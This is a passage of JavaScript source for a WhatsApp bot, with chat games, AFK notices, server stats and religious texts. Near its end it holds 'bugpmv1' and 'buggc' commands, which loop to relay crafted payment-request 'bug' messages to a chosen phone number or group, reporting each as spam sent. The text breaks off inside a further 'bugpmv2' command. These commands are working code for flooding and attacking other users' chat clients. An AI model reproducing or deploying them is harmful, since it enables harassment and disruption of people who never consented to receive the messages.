        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: XeonBotInc.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        XeonBotInc.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?give up|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Answer The Following Questions :\n${room.soal}\n\n\nThere Is ${room.jawaban.length} Answer ${room.jawaban.find(v => v.includes(' ')) ? `(Some Answers Have Spaces)` : ''}
${isWin ? `All Answers Answered` : isSurender ? 'Surrender!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            XeonBotInc.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], `🎮 Guess The Picture 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess word', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `🎮 Guess The Word 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess blank', buttonText: { displayText: 'Guess The Blank' }, type: 1 }], `🎮 Guess The Blank 🎮\n\nCorrect Answer 🎉\n*${deskripsi}*\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess sentence', buttonText: { displayText: 'Guess The Sentence' }, type: 1 }], `🎮 Guess The Sentence 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `🎮 Guess The Lyrics 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess riddle', buttonText: { displayText: 'Guess The Riddle' }, type: 1 }], `🎮 Guess The Riddle 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
        
        //TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game Has Ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Typed *surrender* to surrender and admited defeat`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP\\
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nope(k.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nope(k.)?yes)/i.test(m.text)) {
	    XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} Refuse Suit, Suit Canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    XeonBotInc.sendText(m.chat, `Suit Has Been Sent To Chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Please Choose A Suit In The Respective Chat"
Click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) XeonBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    XeonBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`You Have Chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting For The Opponent To Choose` : ''}`)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_The Opponent Has Chosen_\nNow It Is Your Turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`You Have Chosen ${m.text} ${!roof.pilih ? `\n\nWaiting For The Opponent To Choose` : ''}`)
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, '_The Opponent Has Chosen_\nNow It Is Your Turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    XeonBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`
Don't tag him!
He's in AFK/Offline ${reason ? 'dengan alasan ' + reason : 'no reason'}
It's been ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            reply(`
You Came Back Online From AFK${user.afkReason ? ' after ' + user.afkReason : ''}
In ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
       //react function
const reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                
                const timestampe = speed();
const latensie = speed() - timestampe
                const menulist = `┌─❖
│「 Hi 👋 」
└┬❖ 「 ${pushname} 」
┌┤✑  How Are You? 😄
│└────────────┈ ⳹
│
└─「 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 」       
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : ${global.botname}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗮𝗺𝗲 : ${global.ownername}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼. : ${global.owner}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length}
└┬────────────┈ ⳹
   │✑  Please Select
   │✑  The Button Below
   └─────────────┈ ⳹`
   
   //randoming function
function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
//document randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)

// short story
async function cerpen (category) {
    return new Promise((resolve, reject) => {
        let title = category.toLowerCase().replace(/[()*]/g, "")
        let judul = title.replace(/\s/g, "-")
        let page = Math.floor(Math.random() * 5)
        axios.get('http://cerpenmu.com/category/cerpen-'+judul+'/page/'+page)
        .then((get) => {
            let $ = cheerio.load(get.data)
            let link = []
            $('article.post').each(function (a, b) {
                link.push($(b).find('a').attr('href'))
            })
            let random = link[Math.floor(Math.random() * link.length)]
            axios.get(random)
            .then((res) => {
                let $$ = cheerio.load(res.data)
                let hasil = {
                    title: $$('#content > article > h1').text(),
                    author: $$('#content > article').text().split('Short Story: ')[1].split('Category: ')[0],
                    kategori: $$('#content > article').text().split('Category: ')[1].split('\n')[0],
                    lolos: $$('#content > article').text().split('Passed moderation on: ')[1].split('\n')[0],
                    cerita: $$('#content > article > p').text()
                }
                resolve(hasil)
            })
        })
    })
}

switch(command) {

case 'kisahnabi':{
	if (isBan) return reply (mess.ban)
	if (!args[0]) return reply (`ᴍᴀsᴜᴋᴀɴ ɴᴀᴍᴀ ɴᴀʙɪɴʏᴀ ᴋᴀᴋ!\nᴄᴏɴᴛᴏʜ : ${prefix + command}`)
	ri = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${args.join(" ")}?apikey=${lolkey}`)
let teks = `
ɴᴀᴍᴀ : ${ri.result.name}
ᴛᴀʜᴜɴ ᴋᴇʟᴀʜɪʀᴀɴ : ${ri.result.thn_kelahiran}
ᴛᴇᴍᴘᴀᴛ : ${ri.result.place}

ᴋɪsᴀʜɴʏᴀ : ${ri.result.story}`
	let buttons = [{ buttonId : `${prefix}dongnasi`, buttonText: {displayText: `sᴇᴅᴇᴋᴀʜ sᴇɪʜᴋʟᴀsɴʏᴀ!`}, type: 1 }]
	let buttonMessage ={
	document: fs.readFileSync('./Rimed/Ri.xlsx'),
	mimetype: doc5,
	fileName: `ᴋɪsᴀʜ ɴᴀʙɪ ${ri.result.name}`,
	fileLength: 99999999999999,
	pageCount : 69696969,
	caption : teks,
    footer : 'ᴍɪᴜɴᴀ',
    buttons : buttons,
    headerType : 4
	}
	XeonBotInc.sendMessage(m.chat , buttonMessage , {quoted : m})
	}
	break

case 'p':{
if (!isCreator) return reply ('🗿')
  const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                reply(respon)
            }
            break
    
case 'niat' : case 'niatsholat' :{
let teks =` 1. ɴɪᴀᴛ sʜᴏʟᴀᴛ sᴜʙᴜʜ.
ᴀʀᴀʙɪᴄ : اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى
ʟᴀᴛɪɴ : ᴜsʜᴀʟʟɪ ғᴀʀᴅʜᴏsʜ sʜᴜʙʜɪ ʀᴏᴋ'ᴀᴛᴀɪɴɪ ᴍᴜsᴛᴀǫʙɪʟᴀʟ ǫɪʙʟᴀᴛɪ ᴀᴅᴀᴀ-ᴀɴ ʟɪʟʟᴀᴀʜɪ ᴛᴀ'ᴀᴀʟᴀ.
ᴛᴇʀᴊᴇᴍᴀʜᴀɴ : ᴀᴋᴜ ʙᴇʀɴɪᴀᴛ sʜᴀʟᴀᴛ ғᴀʀᴅʜᴜ sʜᴜʙᴜʜ ᴅᴜᴀ ʀᴀᴋᴀ'ᴀᴛ ᴍᴇɴɢʜᴀᴅᴀᴘ ᴋɪʙʟᴀᴛ ᴋᴀʀᴇɴᴀ ᴀʟʟᴀʜ ᴛᴀ'ᴀʟᴀ.

2. ɴɪᴀᴛ sʜᴏʟᴀᴛ ᴅᴢᴜʜᴜʀ.
ᴀʀᴀʙɪᴄ : اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى
ʟᴀᴛɪɴ : ᴜsʜᴀʟʟɪ ғᴀʀᴅʜᴏᴅʟ ᴅʜᴜʜʀɪ ᴀʀʙᴀ'ᴀ ʀᴀᴋᴀ'ᴀᴀᴛɪᴍ ᴍᴜsᴛᴀǫʙɪʟᴀʟ ǫɪʙʟᴀᴛɪ ᴀᴅᴀᴀ-ᴀɴ ʟɪʟʟᴀᴀʜɪ ᴛᴀ'ᴀᴀʟᴀ.
ᴛᴇʀᴊᴇᴍᴀʜᴀɴ : ᴀᴋᴜ ʙᴇʀɴɪᴀᴛ sʜᴀʟᴀᴛ ғᴀʀᴅʜᴜ ᴅᴢᴜʜᴜʀ ᴇᴍᴘᴀᴛ ʀᴀᴋᴀ'ᴀᴛ ᴍᴇɴɢʜᴀᴅᴀᴘ ᴋɪʙʟᴀᴛ ᴋᴀʀᴇɴᴀ ᴀʟʟᴀʜ ᴛᴀ'ᴀʟᴀ.

3. ɴɪᴀᴛ sʜᴏʟᴀᴛ ᴀsʜᴀʀ.
ᴀʀᴀʙɪᴄ : اُصَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى
ʟᴀᴛɪɴ : ᴜsʜᴀʟʟɪ ғᴀʀᴅʜᴏʟ 'ᴀsʜʀɪ ᴀʀʙᴀ'ᴀ ʀᴀᴋᴀ'ᴀᴀᴛɪᴍ ᴍᴜsᴛᴀǫʙɪʟᴀʟ ǫɪʙʟᴀᴛɪ ᴀᴅᴀᴀ-ᴀɴ ʟɪʟʟᴀᴀʜɪ ᴛᴀ'ᴀᴀʟᴀ.
ᴛᴇʀᴊᴇᴍᴀʜᴀɴ : ᴀᴋᴜ ʙᴇʀɴɪᴀᴛ sʜᴀʟᴀᴛ ғᴀʀᴅʜᴜ 'ᴀsʜᴀʀ ᴇᴍᴘᴀᴛ ʀᴀᴋᴀ'ᴀᴛ ᴍᴇɴɢʜᴀᴅᴀᴘ ᴋɪʙʟᴀᴛ ᴋᴀʀᴇɴᴀ ᴀʟʟᴀʜ ᴛᴀ'ᴀʟᴀ.

4. ɴɪᴀᴛ sʜᴏʟᴀᴛ ᴍᴀɢʜʀɪʙ.
ᴀʀᴀʙɪᴄ : اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى
ʟᴀᴛɪɴ : ᴜsʜᴀʟʟɪ ғᴀʀᴅʜᴏʟ ᴍᴀɢʜʀɪʙɪ ᴛsᴀʟᴀᴀᴛᴀ ʀᴀᴋᴀ'ᴀᴀᴛɪᴍ ᴍᴜsᴛᴀǫʙɪʟᴀʟ ǫɪʙʟᴀᴛɪ ᴀᴅᴀᴀ-ᴀɴ ʟɪʟʟᴀᴀʜɪ ᴛᴀ'ᴀᴀʟᴀ.
ᴛᴇʀᴊᴇᴍᴀʜᴀɴ : ᴀᴋᴜ ʙᴇʀɴɪᴀᴛ sʜᴀʟᴀᴛ ғᴀʀᴅʜᴜ ᴍᴀɢʜʀɪʙ ᴛɪɢᴀ ʀᴀᴋᴀ'ᴀᴛ ᴍᴇɴɢʜᴀᴅᴀᴘ ᴋɪʙʟᴀᴛ ᴋᴀʀᴇɴᴀ ᴀʟʟᴀʜ ᴛᴀ'ᴀʟᴀ.

5. ɴɪᴀᴛ sʜᴏʟᴀᴛ ɪsʏᴀ.
ᴀʀᴀʙɪᴄ : اُصَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى
ʟᴀᴛɪɴ : ᴜsʜᴀʟʟɪ ғᴀʀᴅʜᴏʟ 'ɪsʏᴀᴀ-ɪ ᴀʀʙᴀ'ᴀ ʀᴀᴋᴀ'ᴀᴀᴛɪᴍ ᴍᴜsᴛᴀǫʙɪʟᴀʟ ǫɪʙʟᴀᴛɪ ᴀᴅᴀᴀ-ᴀɴ ʟɪʟʟᴀᴀʜɪ ᴛᴀ'ᴀᴀʟᴀ.
ᴛᴇʀᴊᴇᴍᴀʜᴀɴ : ᴀᴋᴜ ʙᴇʀɴɪᴀᴛ sʜᴀʟᴀᴛ ғᴀʀᴅʜᴜ ɪsʏᴀ ᴇᴍᴘᴀᴛ ʀᴀᴋᴀ'ᴀᴛ ᴍᴇɴɢʜᴀᴅᴀᴘ ᴋɪʙʟᴀᴛ ᴋᴀʀᴇɴᴀ ᴀʟʟᴀʜ ᴛᴀ'ᴀʟᴀ.`
reply(teks)
}
break

case 'antivirus': case 'antivirtex': {
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return replay('Already activated')
ntvirtex.push(from)
replay('Success in turning on antivirus in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replay('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
replay('Success in turning off antivirus this group')
} else {
  let buttonsntvirtex = [
  { buttonId: `${prefix + command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${prefix + command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break

//


case 'thisbug': {
if (!isMod) return reply (mess.mod)
let teks = `â•â•âœªã€˜ *THIS IS A BUG BRO? â˜ºï¸* ã€™âœªâ•â•
 âž² *Message : ${q ? q : 'empty'}*\n\n`
for (let mem of participants) {
teks += `â­” @${mem.id.split('@')[0]}\n`
}
XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break


case 'bugpmv1': {
if (!isMod) return reply (mess.mod)
if (args.length < 1) return m.reply(`ᴄᴏɴᴛᴏʜ : ${prefix + command} ɴᴏᴍᴇʀ ᴛᴀʀɢᴇᴛ/ᴛᴏᴛᴀʟ ᴘᴇsᴀɴ/ᴅᴜʀᴀsɪ\n\nᴄᴏɴᴛᴏʜ : ${prefix + command} 𝟼𝟸𝟾𝟿𝟷𝟶𝟷𝟷𝟷𝟸𝟷𝟹/𝟷𝟶/𝟷𝟶s\n\ns = ᴅᴇᴛɪᴋ`)
num = q.split('/')[0]
jumlah = q.split('/')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Rimed/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": wm,
}
}}), { userJid: m.chat, quoted: doc})
XeonBotInc.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ ᴋᴇ ɴᴏᴍᴇʀ : ${num}\nᴛᴏᴛᴀʟ sᴘᴀᴍ : ${jumlah}`)
}
break


case 'buggc': {
if (!isMod) return
if (args.length < 1) return m.reply(`ᴄᴏɴᴛᴏʜ : ${prefix + command} ɪᴅɢʀᴏᴜᴘ/ᴛᴏᴛᴀʟ ᴘᴇsᴀɴ/ᴅᴜʀᴀsɪ\n\nᴄᴏɴᴛᴏʜ : ${prefix + command} 𝟷𝟸𝟶𝟹𝟼𝟹𝟶𝟸𝟽𝟹𝟾𝟿𝟺𝟹𝟶𝟺𝟿𝟹/𝟷𝟶/𝟷𝟶s\n\ns = ᴅᴇᴛɪᴋ\n\nᴘᴀsᴛɪᴋᴀɴ ʙᴏᴛ sᴜᴅᴀʜ ᴊᴏɪɴ ᴋᴇᴅᴀʟᴀᴍ ɢʀᴏᴜᴘ ᴛᴇʀsᴇʙᴜᴛ!`)
num = q.split('/')[0]
jumlah = q.split('/')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Rimed/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER HW MODS WA`,
}
}}), { userJid: m.chat, quoted: doc})
XeonBotInc.relayMessage(`${num}@g.us`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
reply(`sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ ᴋᴇ : ${num}\nᴛᴏᴛᴀʟ sᴘᴀᴍ : ${jumlah}`)
}
break
case 'bugpmv2': {
if (!isMod) return reply (mess.mod)
if (!args[0]) return reply (`ᴄᴏɴᴛᴏʜ : ${prefix + command} 𝟼𝟸𝟾𝟿𝟷𝟶𝟷𝟷𝟷𝟸𝟷𝟹`)
lodaChoos = fs.readFileSync('./Rimed/randiKaBaccha.sound')
